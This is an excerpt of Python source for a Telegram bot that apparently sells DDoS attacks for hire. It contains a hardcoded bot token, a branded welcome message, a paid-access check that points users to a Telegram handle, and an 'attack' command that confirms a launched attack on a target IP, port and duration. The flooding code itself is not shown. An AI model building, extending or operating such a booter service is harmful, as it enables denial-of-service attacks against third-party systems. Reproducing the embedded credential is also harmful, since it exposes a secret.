...
TELEGRAM_BOT_TOKEN = '7994851432:AAEDferBbyYp5e182u14C9qyriMCjzzgaLc'
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        "🌟 **Welcome to┊𝐕𝘪c𝕜𝘆 x Š₳₦JU┊™ D-dos Bot 💥!** 🌟\n\n"
...
async def attack(update: Update, context: CallbackContext):
    ...
    if not is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="❌ **Access Denied!** You are not authorized to use this premium service, get acess: @vickyoct2k08 .", parse_mode='Markdown')
        return
    ...
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"🔥 **や𝐫𝘦𝑚ΐ𝒖Ӎ ₳₮₮₳₵₭ ꮖ𝕟і𝚝ǐᵃ𝚝𝖊𝗱!** 🔥\n"
        f"**𝚃𝙰𝚁𝙶𝙴𝚃🎯:** `{ip}:{port}`\n"
        f"**𝘋ú𝕣ăϮï𝗈𝗻:** `{duration}` seconds\n\n"
        f"—͟͞͞★ Ꭼᥒ𝒋𝗈ⲩ Øür ᴇʟɪᴛᴇ々𝘚ɇ𝗿ѵícɇ!"
    ), parse_mode='Markdown')
